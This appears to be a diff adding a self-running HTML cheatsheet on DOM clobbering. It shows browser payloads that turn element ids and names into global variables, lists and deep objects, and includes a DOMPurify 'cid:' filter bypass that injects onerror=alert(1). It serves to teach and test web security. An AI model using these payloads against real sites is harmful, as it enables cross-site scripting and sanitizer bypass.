@@ -1,0 +1,91 @@
+<html>
+<head>
+<title>DOM Clobbering</title>
+<style>
+* {font-family: Verdana}
+pre {background:#CCC;padding:5px;font-family:Courier;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}
+</style>
+</head>
+<body>
+<h1>DOM Clobbering Cheatsheet</h1>
+This is a dynamically generated DOM clobbering cheatsheet designed to show how different payloads work in different browsers. Note that some payloads will not work in certain browsers, and in some cases payloads may not fire properly due to timing issues. Clearing the cache and refreshing the page can help solve this.
+<div id="results"></div>
+<div id="tests" style="visibility:hidden">
+<form id=payload1></form>
+<a id=payload2 href=payload></a>
+<a id=payload3 href=index_0_payload><a id=payload3 href=index_1_payload>
+<a id=payload4><a id=payload4 name=foo href=payload>
+<a id=payload5><a id=payload5 name=foo href=cid:&quot;/onerror=alert(1)//>
+<form id=payload6 name=a><input id=b value=payload></form><form id=payload6></form>
+<iframe name=payload7 srcdoc="<a id=a href=payload></a>"></iframe><style>@import 'https://google.com';</style>
+<iframe name=payload8 srcdoc="<iframe srcdoc='<iframe name=b srcdoc=<a/id=c&amp;amp;#x20;name=d&amp;amp;#x20;href=\payload&amp;amp;gt;<a&amp;amp;#x20;id=c&amp;amp;gt; name=c>' name=a>"></iframe><style>@import 'https://google.co.uk';</style>
+</div>
+<script>
+function encodeHTMLEntities(text) {
+    let textArea = document.createElement("textarea");
+    textArea.innerText = text;
+    let encodedOutput = textArea.innerHTML;
+    let arr = encodedOutput.split("<br>");
+    encodedOutput=arr.join("\n");
+    return encodedOutput;
+}
+
+function addTitle(title, desc, payload) {
+    let results = document.getElementById("results");
+    let element = document.createElement("p");
+    element.innerHTML = ((title == null) ? "" : "<h3>" + title + "</h3>" + ((desc) ? desc + "<br />" : "") + "<pre>") + ((payload == null) ? "null" : encodeHTMLEntities(payload)) + "</pre>";
+    results.appendChild(element);
+}
+
+function addResult(title, result) {
+    let results = document.getElementById("results");
+    let element = document.createElement("p");
+    element.innerHTML = ((title == null) ? "" : "<strong>JS: " + title + "</strong><br /><pre>") + ((result == null) ? "null" : encodeHTMLEntities(result)) + "</pre>";
+    results.appendChild(element);
+}
+
+function addSep() {
+    let results = document.getElementById("results");
+    let element = document.createElement("hr");
+    results.appendChild(element);
+}
+
+addTitle("Basic DOM Clobbering", "By setting <em>either</em> the <strong>id</strong> or <strong>name</strong> attribute on the following elements (embed, form, iframe, image, img, object), we can create objects as global variables in the DOM:", "<form id=payload1></form>\n\nOR\n\n<form name=payload1></form>");
+addResult("typeof(window.payload1)", (typeof(window.payload1)));
+addResult("window.payload1", (window.payload1));
+addResult("payload1", (payload1));
+addSep();
+addTitle("DOM Clobbering with Anchors", "The anchor (&lt;a&gt;) element is treated differently. The global variable's \"value\" is set to the href attribute value (or an empty string if no href was set):", "<a id=payload2 href=payload></a>");
+addResult("payload2", (payload2));
+addSep();
+addTitle("Creating Arrays / Lists using DOM Clobbering", "If two or more elements with the same id / name are added, the DOM will create an array (list) of these elements which can be referenced by their index:", "<a id=payload3 href=index_0_payload><a id=payload3 href=index_1_payload>")
+addResult("payload3", (payload3));
+addResult("payload3[0]", (payload3[0]));
+addResult("payload3[1]", (payload3[1]));
+addSep();
+addTitle("Creating Custom Attributes using DOM Clobbering", "We can use this to clobber custom attributes of objects by creating an array and using the name attribute of the 2nd element to specify the attribute name (in this case \"foo\"):", "<a id=payload4><a id=payload4 name=foo href=payload>")
+addResult("payload4", (payload4));
+addResult("payload4[1]", (payload4[1]));
+addResult("payload4.foo", (payload4.foo));
+addSep();
+addTitle("Custom Attribute Exploit", "We can exploit this by setting the href value to whatever we want to inject into the DOM, for example if our clobbered object is used to create an img tag, we could attempt an attribute breakout and insert an onerror. Note that the \"cid:\" is a DOMPurify specific filter bypass:", "<a id=payload5><a id=payload5 name=foo href=cid:&quot;/onerror=alert(1)//>")
+addResult("payload5", (payload5));
+addResult("payload5[1]", (payload5[1]));
+addResult("payload5.foo", (payload5.foo));
+addSep();
+addTitle("Creating Deeper Custom Attributes using DOM Clobbering with Forms", "If further depth is needed, forms can be used, however the \"value\" attribute needs to be referenced:", "<form id=payload6 name=a><input id=b value=payload></form><form id=payload6></form>");
+addResult("payload6", (payload6));
+addResult("payload6.a", (payload6.a));
+addResult("payload6.a.b", (payload6.a.b));
+addResult("payload6.a.b.value", (payload6.a.b.value));
+addSep();
+addTitle("Creating Custom Attributes using DOM Clobbering with IFrames", "IFrames can be very useful for DOM Clobbering, however a delay needs to be introduced for the IFrame to load. This can be done using the &lt;style&gt; import:", "<iframe name=payload7 srcdoc=\"<a id=a href=payload></a>\"></iframe><style>@import 'https://google.com';</style>");
+addResult("payload7", (payload7));
+addResult("payload7.a", (payload7.a));
+addSep();
+addTitle("Creating Arbitrarily Deep Custom Attributes using DOM Clobbering with IFrames", "IFrames are powerful for DOM Clobbering since they can be used to \"easily\" create arbitrarily deep attributes. For example, this object has attributes which are 4 levels deep:", "<iframe name=payload8 srcdoc=\"<iframe srcdoc='<iframe name=b srcdoc=<a/id=c&amp;amp;#x20;name=d&amp;amp;#x20;href=\\payload&amp;amp;gt;<a&amp;amp;#x20;id=c&amp;amp;gt; name=c>' name=a>\"></iframe><style>@import 'https://google.co.uk';</style>");
+addResult("payload8", (payload8));
+addResult("payload8.a.b.c.d", (payload8.a.b.c.d));
+</script>
+</body>
+</html>
